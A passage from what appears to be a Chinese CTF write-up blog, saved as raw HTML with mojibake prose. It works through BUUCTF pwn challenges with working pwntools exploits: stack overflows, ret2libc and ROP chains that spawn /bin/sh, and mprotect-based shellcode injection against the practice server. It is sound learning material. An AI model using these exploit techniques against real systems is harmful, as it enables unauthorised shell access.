data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4nqinxmwlx1c.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4ch8nuo8by9s.webp"></p><p>â€‹    ä¸€çœ¼æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå…ˆä¸åšï¼Œç­‰åé¢å…·ä½“å­¦åˆ°çš„æ—¶å€™å†åšã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230304/%E5%9B%BE%E7%89%87.1b3db6v08sjk.webp"></p><p>â€‹    çœ‹èµ·æ¥å¾ˆéš¾ï¼Œå®åˆ™FMTçš„æ¼æ´éƒ½æ²¡åˆ©ç”¨ï¼Œç›´æ¥åˆ©ç”¨scanfå‡½æ•°ç›´æ¥å°†var[13]æ”¹ä¸º0x11ï¼Œç„¶ågetshellã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27852</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="0x9-jarvisoj-level2"><a href="#0x9-jarvisoj-level2" class="headerlink" title="0x9.jarvisoj_level2"></a>0x9.jarvisoj_level2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.1sq2h0835mgw.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.3796vqjfkw00.webp"></p><p>â€‹    ä¸¤è€…éƒ½æœ‰ï¼Œç®€å•é¢˜ã€‚</p><h3 id="æ–¹æ³•ä¸€ï¼šret2libc1"><a href="#æ–¹æ³•ä¸€ï¼šret2libc1" class="headerlink" title="æ–¹æ³•ä¸€ï¼šret2libc1"></a>æ–¹æ³•ä¸€ï¼šret2libc1</h3><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27861</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">system_plt = <span class="number">0x8048320</span></span><br><span class="line">bin_sh = <span class="number">0x0804a024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c.recvuntil(b&#x27;echo Input:&#x27;)</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input:&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>,system_plt,<span class="string">&#x27;aaaa&#x27;</span>,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6p9fegs2e6f4.webp"></p><pre><code> æˆ‘åœ¨è¿™é‡ŒçŠ¯äº†ä¸€ä¸ªç®€å•çš„é”™è¯¯ï¼š</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c.recvuntil(<span class="string">b&#x27;echo Input:&#x27;</span>)<span class="comment">#Ã—</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input:&quot;</span>)     <span class="comment">#âˆš</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.5v9djifmcf40.webp"></p><h3 id="æ–¹æ³•äºŒï¼šret2syscall"><a href="#æ–¹æ³•äºŒï¼šret2syscall" class="headerlink" title="æ–¹æ³•äºŒï¼šret2syscall"></a>æ–¹æ³•äºŒï¼šret2syscall</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.48qji9fk6074.webp"></p><p>â€‹    <code>int 80</code>éƒ½æ²¡æœ‰ï¼Œé‚æ”¾å¼ƒè¿™ç§æ–¹æ³•ã€‚</p><h2 id="0x0a-bjdctf-2020-babystack"><a href="#0x0a-bjdctf-2020-babystack" class="headerlink" title="0x0a.bjdctf_2020_babystack"></a>0x0a.bjdctf_2020_babystack</h2><h3 id="æ–¹æ³•ä¸€ï¼šret2libc1-1"><a href="#æ–¹æ³•ä¸€ï¼šret2libc1-1" class="headerlink" title="æ–¹æ³•ä¸€ï¼šret2libc1"></a>æ–¹æ³•ä¸€ï¼šret2libc1</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.1kc6eqo5murk.webp"></p><p>â€‹    æ ¹æ®é¢˜ç›®æè¿°åº”è¯¥æ˜¯<code>ç­¾åˆ°é¢˜</code></p><p>â€‹    <mark>å§‹ç»ˆè¦æ˜ç¡®ä½æ•°ï¼ä¼ å‚è§„åˆ™ï¼</mark></p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28531</span>)</span><br><span class="line">bin_sh = <span class="number">0x0000000000400858</span></span><br><span class="line">ret = <span class="number">0x0400561</span></span><br><span class="line">pop_rdi_ret =<span class="number">0x0000000000400833</span></span><br><span class="line">system_addr = <span class="number">0x400590</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;[+]Please input the length of your name:\n&quot;</span>)</span><br><span class="line">c.sendline(<span class="string">b&quot;100&quot;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&quot;[+]What&#x27;s u name?\n&quot;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>,pop_rdi_ret,bin_sh,system_addr])</span><br><span class="line">c.sendline(payload1)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4rn0yh4ygbr4.webp"></p><p>â€‹    ä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨flatç”Ÿæˆçš„payloadä¸€ç›´æŠ¥é”™</p><p><code>timeout: the monitored command dumped core</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.3s1bjkoc9xs0.webp"></p><p>â€‹    ä½†æ˜¯ç”¨p64() æ˜¯å¯ä»¥æ‰“é€šçš„ï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230117153441613.17xxt63q3cow.webp"></p><h3 id="æ–¹æ³•äºŒ-ret2syscall-64"><a href="#æ–¹æ³•äºŒ-ret2syscall-64" class="headerlink" title="æ–¹æ³•äºŒ ret2syscall 64"></a>æ–¹æ³•äºŒ ret2syscall 64</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.344cnf80pyf4.webp"></p><p>æ²¡æœ‰<code>syscall</code>ï¼Œæ•…æ”¾å¼ƒã€‚</p><h2 id="0x0b-get-started-3dsctf-2016"><a href="#0x0b-get-started-3dsctf-2016" class="headerlink" title="0x0b.get_started_3dsctf_2016"></a>0x0b.get_started_3dsctf_2016</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.10qafbc4gh68.webp"></p><h3 id="æ–¹æ³•ä¸€ï¼šä¸ç”¨äº¤äº’çš„ä¼ å‚"><a href="#æ–¹æ³•ä¸€ï¼šä¸ç”¨äº¤äº’çš„ä¼ å‚" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä¸ç”¨äº¤äº’çš„ä¼ å‚"></a>æ–¹æ³•ä¸€ï¼šä¸ç”¨äº¤äº’çš„ä¼ å‚</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26026</span>)</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(get_flag) + p32(<span class="number">0xdeedbeef</span>) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    ç†åº”æ¥è¯´æ˜¯åº”è¯¥å¯ä»¥æ‰“é€šçš„ä½†æ˜¯ç»“æœæ˜¯æ‰“ä¸é€šï¼š<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.2hj4xt0e8nsw.webp"></p><p>â€‹    åœ¨ç½‘ä¸Šæœäº†ä¸€ä¸‹WPæ‰å‘ç°æ˜¯<code>æœ¬é¢˜æ²¡æœ‰å¼€å¯æ ‡å‡†è¾“å‡º</code></p><p><mark>tipsï¼šæœ€åå¿…é¡»è¦è¿”å›exitï¼Œå› ä¸ºæœ¬é¢˜æ²¡æœ‰å¼€å¯æ ‡å‡†è¾“å…¥è¾“å‡ºï¼Œè¾“å…¥è¾“å‡ºä¼šåœ¨ç¼“å†²åŒºå‘†ç€ï¼Œè€Œexitæ‰§è¡Œåä¼šå°†ç¼“å†²åŒºè¾“å‡ºï¼Œåˆ™å¯å›æ˜¾å‡ºflagã€‚</mark></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26026</span>)</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(get_flag) + p32(main_addr) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)  <span class="comment"># ä¼ å…¥a1ï¼Œa2æ»¡è¶³ifæ¡ä»¶</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(exit_addr) + p32(main_addr) + p32(<span class="number">0</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(c.recv())</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6p2mtf5sineo.webp"></p><h3 id="æ–¹æ³•äºŒï¼šshellcode"><a href="#æ–¹æ³•äºŒï¼šshellcode" class="headerlink" title="æ–¹æ³•äºŒï¼šshellcode"></a>æ–¹æ³•äºŒï¼šshellcode</h3><p>â€‹    <mark>ä¹‹å‰åœ¨wiki-ret2shellcodeæ—¶å€™æ›¾ç»è€ƒè™‘è¿‡çš„é—®é¢˜ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰è½å®ï¼Œè¶ç€è¿™é“é¢˜çš„æœºä¼šï¼Œè½å®ä¸€ä¸‹ï¼</mark></p><blockquote><p>åˆ©ç”¨mprotectå‡½æ•°</p></blockquote><p>â€‹    å› ä¸ºæœ¬é¢˜æ˜¯é™æ€é“¾æ¥ï¼Œæœäº†ä¸€ä¸‹æœ‰<code>mprotect</code>å‡½æ•°ï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.imy7guwegoo.webp"></p><p>vmmapä¸€ä¸‹ï¼ŒRW and not X</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6wvnei5sv9mo.webp"></p><p>â€‹    å­¦åˆ°äº†ä¸€ä¸ªå¥½ä¸œè¥¿ï¼šIDAä¸­    <code>Ctrl+s</code>    </p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.2abagqdnv1kw.webp"></p><p>â€‹    æˆ‘è‡ªå·±å†™çš„payloadä½†æ˜¯æ‰“ä¸é€š:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æˆ‘å°±æƒ³åˆ©ç”¨mprotectå‡½æ•°å°†bssæŒ‡å®šæ®µä¿®æ”¹æˆå¯æ‰§è¡Œï¼Œç„¶åç›´æ¥å†™å…¥shellcodeæ‰§è¡Œææƒ</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/12&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">buf = <span class="number">0x80EB000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify to executable</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect) + p32(main_addr) + p32(buf) + p32(<span class="number">0x1000</span>) +p32(<span class="number">0x7</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(buf) + shellcode</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    æ‰“å¾—é€šçš„ç‰ˆæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ©ç”¨äº†readå‡½æ•°å†™å…¥</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26842</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/12&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line">mprotect_addr = <span class="number">0x0806EC80</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">buf = <span class="number">0x80EB000</span></span><br><span class="line"><span class="comment"># buf = 0x080EBF80 ä¸ºä»€ä¹ˆè¿™ä¸ªèµ·å§‹ä½ç½®ä¸å¯ä»¥ï¼Ÿ</span></span><br><span class="line">pop_edi_esi_ebx_ret = <span class="number">0x08063adb</span></span><br><span class="line">pop_ebx_esi_edi_ret = <span class="number">0x080509a5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(mprotect_addr)+p32(pop_edi_esi_ebx_ret)+p32(buf)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)+p32(read_addr)+p32(buf)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x200</span>)</span><br><span class="line"><span class="comment"># payload=b&#x27;a&#x27;*0x38+p32(mprotect_addr)+p32(pop_ebx_esi_edi_ret)+p32(buf)+p32(0x1000)+p32(0x7)+p32(read_addr)+p32(buf)+p32(0)+p32(buf)+p32(0x200)</span></span><br><span class="line"><span class="comment"># ä¸ºä»€ä¹ˆè¦ä¸‰ä¸ªå¯„å­˜å™¨ï¼Ÿè€Œä¸”è¿™ä¸‰ä¸ªå¯„å­˜å™¨æ˜¯ä»€ä¹ˆéƒ½ä¸é‡è¦ï¼Ÿæˆ‘æ‡‚äº†ï¼è®©espè‡ªå¢ç„¶åæŒ‡å‘read_addr!è¯¦æƒ…å‚çœ‹ret2libc2</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload =shellcode</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>â€‹        æ¯”èµ·ä¸Šä¸€ç‰ˆï¼Œè¿™ä¸ªç‰ˆæœ¬æ›´æ¸…æ™°æ˜“æ‡‚ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># c = remote(&quot;node4.buuoj.cn&quot;,26842)</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/12&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">buf = <span class="number">0x80EC000</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify to executable</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(mprotect) + p32(main_addr) + p32(buf) + p32(<span class="number">0x1000</span>) +p32(<span class="number">0x7</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write shellcode </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p32(read_addr) + p32(buf) + p32(<span class="number">0</span>) + p32(buf) +p32(<span class="number">0x100</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"><span class="comment"># Exec shellcode </span></span><br><span class="line"><span class="comment"># HOW? BY READ&#x27;RET</span></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x0c-OGeek2019-babyrop"><a href="#0x0c-OGeek2019-babyrop" class="headerlink" title="0x0c.[OGeek2019]babyrop"></a>0x0c.[OGeek2019]babyrop</h2><p><code>ret2libc3</code>  &amp;&amp; <code>ROP trick</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4dj5dg9n3gw0.webp"></p><p>å¤§ä½¬å†™çš„å¾ˆè¯¦ç»†ï¼Œè¯¦æƒ…å‚è€ƒï¼š<a class="link" href="https://blog.csdn.net/Invin_cible/article/details/121322885?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167558256416800215084291%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167558256416800215084291&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121322885-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=%5BOGeek2019%5Dbabyrop&spm=1018.2226.3001.4187">æ­¤å¤„<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.46q2lsv5nveo.webp"></p><p><mark>æ­¤é¢˜æ‰€å¾—ç»éªŒï¼š</mark></p><ol><li>ä¸€å¼€å§‹æˆ‘å®åœ¨æ²¡æƒ³åˆ°æ­¤é¢˜çš„æº¢å‡ºæ¡ä»¶åœ¨å“ªé‡Œï¼Œåé¢çœ‹è§å¤§ä½¬åšæ–‡ï¼Œæ‰å‘ç°è¿™ä¸ªå‡½æ•°ç©¿çš„æ˜¯<code>ASCIIç å€¼</code>ï¼ŒåŸºç¡€ä¸ç‰¢å›º:crying_cat_face:<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.5g0mwmmofaio.webp"></li><li><code>v1=0</code>æ¥ç»•è¿‡çœŸçš„è®©äººæç„¶å¤§æ‚Ÿã€‚</li></ol><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.3xuuoah1efpc.webp"></p><h2 id="0x0d-jarvisoj-level2-x64"><a href="#0x0d-jarvisoj-level2-x64" class="headerlink" title="0x0d.jarvisoj_level2_x64"></a>0x0d.jarvisoj_level2_x64</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4iv5jolko5c0.webp"></p><p>â€‹    ç®€å•é¢˜ï¼Œæœ‰<code>system</code>ï¼Œæœ‰<code>/bin/sh</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary 14 --string &#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="string">objdump -d 14 | grep &#x27;plt&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary 14 --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27765</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">bin_sh = <span class="number">0x600a90</span></span><br><span class="line">system_addr = <span class="number">0x4004c0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.4745hx1vhp1c.webp"></p><h2 id="0x0e-HarekazeCTF2019-baby-rop"><a href="#0x0e-HarekazeCTF2019-baby-rop" class="headerlink" title="0x0e.[HarekazeCTF2019]baby_rop"></a>0x0e.[HarekazeCTF2019]baby_rop</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.43rj8gqp5wsg.webp"></p><p>â€‹    è€ƒæ³•ä¸å‰é¢˜ç›®ä¸€è‡´ç®€å•é¢˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = remote(&quot;node4.buuoj.cn&quot;,28511)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">bin_sh = 0x0601048</span><br><span class="line">system_addr = 0x400490</span><br><span class="line">pop_rdi_ret = 0x400683</span><br><span class="line">c.recvuntil(b&#x27;What&#x27;s your name? &#x27;)</span><br><span class="line">payload = b&#x27;a&#x27;*0x18 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    åªä¸è¿‡flagè—å¾—å¾ˆæ·±ï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.57dajuf4dhts.webp"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / - name &#x27;flag&#x27;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6nisyx4km5q8.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.1a21v72uanb4.webp"></p><h2 id="0x10-ciscn-2019-en-2"><a href="#0x10-ciscn-2019-en-2" class="headerlink" 